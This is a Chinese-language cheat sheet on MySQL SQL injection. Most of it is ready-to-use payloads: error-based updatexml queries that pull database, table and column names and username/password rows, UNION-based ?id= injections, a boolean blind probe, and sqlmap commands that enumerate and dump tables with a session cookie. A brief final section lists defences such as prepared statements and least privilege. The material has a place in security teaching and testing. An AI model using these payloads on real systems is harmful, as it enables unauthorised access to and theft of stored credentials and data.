# MySQL 注入安全知识

## 1. SQL 注入概述

SQL 注入（SQL Injection）是一种攻击技术，攻击者通过构造特殊的 SQL 语句，使数据库执行未授权的查询或操作，从而泄露、篡改、删除数据库中的数据。

## 2. 报错注入（Error-Based Injection）

利用 MySQL 的报错机制获取数据库信息。

### 2.1 获取数据库名称

```sql
SELECT updatexml(1, CONCAT(0x7e, DATABASE()), 1);
' OR updatexml(1, CONCAT(0x7e, DATABASE()), 1);#
```

### 2.2 获取数据库中的表名

```sql
SELECT updatexml(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()), 0x7e), 1);
' OR updatexml(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()), 0x7e), 1);#
```

如果数据库中仅有一个表：

```sql
SELECT updatexml(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE())), 1);
' OR updatexml(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE())), 1);#
```

### 2.3 获取表中的列名

```sql
SELECT updatexml(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='admin')), 1);
' OR updatexml(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='admin')), 1);#
```

### 2.4 获取表中的数据

获取第一条数据：

```sql
SELECT updatexml(1, CONCAT(0x7e, (SELECT CONCAT(id, ',', username, ',', password) FROM login.user LIMIT 0,1)), 1);
' OR updatexml(1, CONCAT(0x7e, (SELECT CONCAT(username, ',', password) FROM abc.admin LIMIT 1,1)), 1);#
```

获取多条数据：

```sql
SELECT updatexml(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(id, ',', username, ',', password) FROM login.user LIMIT 0,2)), 1);
' OR updatexml(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(id, ',', username, ',', password) FROM login.user LIMIT 0,2)), 1);#
```

## 3. 联合查询注入（Union-Based Injection）

### 3.1 判断列数

```sql
?id=1 ORDER BY n;
```

### 3.2 获取数据库名称

```sql
?id=-1 UNION SELECT 1,2,3,4,5,6,7, DATABASE(),9,10;
```

### 3.3 获取数据库中的表名

```sql
?id=-1 UNION SELECT 1,2,3,4,5,6,7, GROUP_CONCAT(table_name),9,10 FROM information_schema.tables WHERE table_schema=DATABASE();
```

### 3.4 获取表中的列名

```sql
?id=-1 UNION SELECT 1,2,3,4,5,6,7, GROUP_CONCAT(column_name),9,10 FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='manage_user';
```

### 3.5 获取表中的数据

```sql
?id=-1 UNION SELECT 1,2,3,4,5,6,7, GROUP_CONCAT(m_name,0x7e,m_pwd),9,10 FROM manage_user LIMIT 0,1;
```

## 4. 布尔盲注（Boolean-Based Blind Injection）

布尔盲注通过构造布尔表达式，观察页面是否返回相同的结果，从而判断数据。

```sql
' OR ASCII(SUBSTR(DATABASE(),1,1)) > 105#
```

## 5. sqlmap 指令

sqlmap 是一个自动化 SQL 注入检测和利用工具，支持多种注入方式。

### 5.1 获取数据库名称

```bash
sqlmap -u "<url>" --cookie="<cookie_value>" --current-db
```

### 5.2 获取数据库的表

```bash
sqlmap -u "<url>" --cookie="<cookie_value>" -D <Database> --tables
```

### 5.3 获取表中的列

```bash
sqlmap -u "<url>" --cookie="<cookie_value>" -D <Database> -T <table> --columns
```

### 5.4 获取表中的数据

```bash
sqlmap -u "<url>" --cookie="<cookie_value>" -D <Database> -T <table> -C <column1>,<column2> --dump
```

## 6. 防御 SQL 注入

为了防止 SQL 注入攻击，应采用以下措施：

- 使用预处理语句（Prepared Statements）

  ```python
  import pymysql
  conn = pymysql.connect(host='localhost', user='root', password='password', database='test')
  cursor = conn.cursor()
  sql = "SELECT * FROM users WHERE username = %s AND password = %s"
  cursor.execute(sql, (username, password))
  ```

- **使用 ORM（如 SQLAlchemy、Django ORM）**

- **限制数据库用户权限**

- **开启 Web 应用的防火墙（WAF）**

- **过滤和转义用户输入**

- **设置 SQL 查询超时**

通过采取上述防御措施，可以有效降低 SQL 注入攻击的风险。